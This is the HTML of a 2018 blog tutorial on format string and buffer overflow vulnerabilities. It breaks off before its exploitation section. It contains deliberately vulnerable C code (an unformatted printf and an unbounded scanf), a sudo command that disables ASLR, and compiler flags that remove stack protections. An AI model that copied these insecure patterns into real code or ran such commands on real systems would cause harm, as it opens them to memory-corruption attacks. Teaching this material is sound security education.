






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability &middot; PwnFuzz</title>
    <meta name="title" content="Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability &middot; PwnFuzz" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.ca3d76caaadfab05c830305a0574dfec197361ee5b3408fa5ebdcc981b3ab703.css"
    integrity="sha256-yj12yqrfqwXIMDBaBXTf7BlzYe5bNAj6Xr3MmBs6twM="
  />
  
    
    
    
  
  
  
    
    
  
  
    
    
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.0ce71464304b0e7f6f5dc04656b9ff39cbcb7ff30af0a0e1268c1c3147e8ddd8.js"
      integrity="sha256-DOcUZDBLDn9vXcBGVrn/OcvLf/MK8KDhJowcMUfo3dg="
      data-copy="Copy"
      data-copied="Copied"
    ></script>
  
  
  <meta
    name="description"
    content="
      
        A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.
Foreword #I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.
      
    "
  />
  <meta name="google-site-verification" content="K7KosUi5pj-pvy_N51qyPAbh8V777BqtvVdbUcqNslU" />
  
  
  
  <link rel="canonical" href="http://localhost:1313/posts/fmt-bof/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/fmt-bof/">
  <meta property="og:site_name" content="PwnFuzz">
  <meta property="og:title" content="Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability">
  <meta property="og:description" content="A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.
Foreword #I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2018-09-12T22:25:00+00:00">
    <meta property="article:modified_time" content="2018-09-12T22:25:00+00:00">
    <meta property="article:tag" content="Pwn, Fmtstr, Bof, Pwntools, Canary">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability">
<meta name="twitter:description" content="A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.
Foreword #I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Binary Exploitation - Format String \u002b Buffer Overflow Vulnerability",
    "headline": "Binary Exploitation - Format String \u002b Buffer Overflow Vulnerability",
    
    "abstract": "A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.\nForeword #I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.",
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/fmt-bof\/",
    "author" : {
      "@type": "Person",
      "name": "Robin (D4mianWayne)"
    },
    "copyrightYear": "2018",
    "dateCreated": "2018-09-12T22:25:00\u002b00:00",
    "datePublished": "2018-09-12T22:25:00\u002b00:00",
    
    "dateModified": "2018-09-12T22:25:00\u002b00:00",
    
    "keywords": ["pwn, fmtstr, bof, pwntools, canary"],
    
    "mainEntityOfPage": "true",
    "wordCount": "3623"
  }
  </script>


  
  <meta name="author" content="Robin (D4mianWayne)" />
  
    
      <link href="https://twitter.com/D4mianWayne" rel="me" />
    
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="z-40 flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >PwnFuzz</a
  >

    </div>
    
      
      <label id="menu-button" for="menu-controller" class="block sm:hidden">
        <input type="checkbox" id="menu-controller" class="hidden" />
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
        >
          <ul
            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
          >
            <li class="mb-1">
              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span></span
              >
            </li>
            
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/posts/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Blog</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/categories/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Categories</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/about/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >About</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/tags/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Tags</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="https://github.com/D4mianWayne"
                      title=""
                      onclick="close_menu()"
                      target="_blank"
                      >
                        <span
                          class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                        ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    
                    
                      <button
                        id="search-button-1"
                        title="Search (/)"
                      >
                        
                          <span
                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                            ></span
                          >
                        
                      </button>
                    
                  
                </li>
              
                
                  
              
            
          </ul>
        </div>
      </label>
      
      <ul class="hidden list-none flex-row text-end sm:flex">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/posts/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/about/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >About</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="https://github.com/D4mianWayne"
                  title=""
                  target="_blank"
                  >
                    <span
                      class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                
                
                  <button
                    id="search-button-2"
                    title="Search (/)"
                  >
                    
                      <span
                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                        ></span
                      >
                    
                  </button>
                
              
            </li>
          
            
              
          

        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article class="max-w-full">
    <header>
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/"
      >PwnFuzz</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class=" inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/fmt-bof/"
      >Binary Exploitation - Format String &#43; Buffer Overflow Vulnerability</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Binary Exploitation - Format String + Buffer Overflow Vulnerability
      </h1>
    </header>
    <section class="prose mt-6 max-w-full dark:prose-invert">
      <p>A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.</p>
<!-- more -->
<h1 id="foreword" class="relative group">Foreword <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foreword" aria-label="Anchor">#</a></span></h1><p>I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.</p>
<blockquote>
<p>Warning: This post will be long and detailed enough, so hang in there.</p>
</blockquote>
<h1 id="what-is-format-string-vulnerability" class="relative group">What is Format String Vulnerability? <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#what-is-format-string-vulnerability" aria-label="Anchor">#</a></span></h1><p>At first, let&rsquo;s start as we normally would. Format string as in C used to specify the the way data is going to be printed to the screen or console. Consider the following program:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="nf">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="cm">/* No format specifier - here&#39;s the vulnerability */</span>
</span></span><span class="line"><span class="cl">     <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s compile this:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ gcc -o new new.c
</span></span><span class="line"><span class="cl">new.c: In <span class="k">function</span> ‘main’:
</span></span><span class="line"><span class="cl">new.c:3:6: warning: implicit declaration of <span class="k">function</span> ‘printf’ <span class="o">[</span>-Wimplicit-function-declaration<span class="o">]</span>
</span></span><span class="line"><span class="cl">      printf<span class="o">(</span>argv<span class="o">[</span>1<span class="o">])</span><span class="p">;</span> /* No format specifier */
</span></span><span class="line"><span class="cl">      ^~~~~~
</span></span><span class="line"><span class="cl">new.c:3:6: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
</span></span><span class="line"><span class="cl">new.c:3:6: note: include ‘&lt;stdio.h&gt;’ or provide a declaration of ‘printf’
</span></span><span class="line"><span class="cl">new.c:3:6: warning: format not a string literal and no format arguments <span class="o">[</span>-Wformat-security<span class="o">]</span>  &lt;--- Warning <span class="k">for</span> no format specification 
</span></span></code></pre></div><p>Ah, so we got a warning(intended one), let&rsquo;s run:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ ./new Hello
</span></span><span class="line"><span class="cl">Hello  &lt;-- Works fine!  
</span></span><span class="line"><span class="cl">robin@oracle:/tmp$ ./new %x
</span></span><span class="line"><span class="cl">d24f0e8 &lt;-- Wait, what?
</span></span></code></pre></div><p>As you can see it works fine if we give it a string or something else but as soon as we give it a hex format specifier it gives hex data. In case you&rsquo;re wondering, that hex data is an actual address from the program stack. Thus, if there&rsquo;s no format specifier in a program and the data is being printed or shown accordingly, we can use a format specifier as an input parameter to leak stack addresses for own use.</p>
<h1 id="what-is-buffer-overflow" class="relative group">What is Buffer Overflow? <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#what-is-buffer-overflow" aria-label="Anchor">#</a></span></h1><p>I&rsquo;m sure that most of you know what it is but still let&rsquo;s have a recap. Buffer overflow vulnerability occurs when a user gives more input than it was supposed to handle hence making the memory region to overflow by the input. If used smartly, it can be used for many gains.</p>
<p>Consider the following program:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello %s&#34;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x000</span>
</span></span></code></pre></div><p>PS: It was the only simple thing I could think of.</p>
<p>So, as you can see it takes 10 characters as input and display them. Let&rsquo;s compile it and turn off the protections to make it work:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ sudo bash -c <span class="s1">&#39;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#39;</span> <span class="c1"># Turn off the ASLR(Address Space Layout Randomization)</span>
</span></span><span class="line"><span class="cl">robin@oracle:/tmp$ gcc -o bof -fno-stack-protector -z execstack bof.c  <span class="c1"># Makes Stack Executable and turn off stack smashing</span>
</span></span></code></pre></div><p>It&rsquo;s compiled now, time to run it:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:/tmp$ ./bof
</span></span><span class="line"><span class="cl">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class="line"><span class="cl">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></span></code></pre></div><p>A Segementation Fault, we have a buffer overflow vulnerability here.</p>
<blockquote>
<p>Note: The Buffer Overflow program, consider it as a challenge and complete it. Go Pwn!</p>
</blockquote>
<h1 id="protections-on-binaries" class="relative group">Protections on Binaries <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#protections-on-binaries" aria-label="Anchor">#</a></span></h1><p>As you saw earlier, I used some gcc flags to turn off the standard protections. This process is commonly referred to as hardening as these protections prevents the vulnerability to be exploited and hence makes it harder for us to exploit it. These protections includes:-</p>
<ul>
<li>Buffer overflow protection</li>
<li>Stack overwriting protection</li>
<li>Position independent executables (see Address space layout randomization)</li>
<li>Binary stirring (randomizing the address of basic blocks)</li>
<li>Pointer masking (protection against code injection)</li>
<li>Control flow randomization (to protect against control flow diversion)</li>
</ul>
<p>Following are the protections, we will deal with:-</p>
<h4 id="stack-canaries" class="relative group">Stack Canaries <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#stack-canaries" aria-label="Anchor">#</a></span></h4><p>This method works by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer (and thus take control of the process) the canary value must also be <strong>overwritten</strong>. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack.</p>
<h4 id="non-executable-stack" class="relative group">Non-Executable Stack <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#non-executable-stack" aria-label="Anchor">#</a></span></h4><p>Another approach to preventing stack buffer overflow exploitation is to enforce a memory policy on the stack memory region that disallows execution from the stack. This means that in order to execute shellcode from the stack an attacker must either find a way to disable the execution protection from memory, or find a way to put her/his shellcode payload in a non-protected region of memory.
Even if this were not so, there are other ways. The most damning is the so-called return to libc method for shellcode creation. In this attack the malicious payload will load the stack not with shellcode, but with a proper call stack so that execution is vectored to a chain of standard library calls, usually with the effect of disabling memory execute protections and allowing shellcode to run as normal. This works because the execution never actually vectors to the stack itself.
A variant of return-to-libc is return-oriented programming (ROP), which sets up a series of return addresses, each of which executes a small sequence of cherry-picked machine instructions within the existing program code or system libraries, sequence which ends with a return. These so-called gadgets each accomplish some simple register manipulation or similar execution before returning, and stringing them together achieves the attacker&rsquo;s ends. It is even possible to use &ldquo;returnless&rdquo; return-oriented programming by exploiting instructions or groups of instructions that behave much like a return instruction.</p>
<blockquote>
<p>This is an ongoing series on my blog.</p>
</blockquote>
<h1 id="__main__" class="relative group"><strong>main</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#__main__" aria-label="Anchor">#</a></span></h1><p>Now, let&rsquo;s get started:-</p>
<h5 id="attached-files" class="relative group">Attached files: <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#attached-files" aria-label="Anchor">#</a></span></h5><p><a href="/files/binary/q3">q3</a></p>
